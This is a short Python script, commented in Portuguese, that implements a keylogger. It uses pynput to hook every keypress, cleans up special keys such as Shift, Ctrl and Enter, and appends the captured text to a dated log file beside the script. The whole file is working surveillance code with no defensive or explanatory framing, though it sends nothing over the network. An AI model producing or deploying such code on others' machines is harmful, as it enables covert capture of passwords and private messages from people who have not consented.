from pynput.keyboard import Listener
import re
import datetime
import os

# Diretório atual do arquivo
current_directory = os.path.dirname(os.path.abspath(__file__))

# Caminho para o arquivo de log
fileLog = os.path.join(current_directory, "text.txt")
date = datetime.datetime.now().strftime("%d-%m-%Y")
fileName = fileLog + date + ".txt"


def x(k):
    k = str(k)
    k = re.sub(r'\'', '', k)
    k = re.sub(r'Key.delete', ' Delete', k)
    k = re.sub(r'Key.space', '  ', k)
    k = re.sub(r'Key.esc', '', k)
    k = re.sub(r'Key.alt', '', k)
    k = re.sub(r'Key.ctrl', '', k)
    k = re.sub(r'Key.shift', '', k)
    k = re.sub(r'Key.enter', ' Enter ', k)
    k = re.sub(r'Key.backspace', ' Backspace ', k)

    with open(fileName, "a") as log:
        log.write(k)


with Listener(on_press=x) as l:
    l.join()
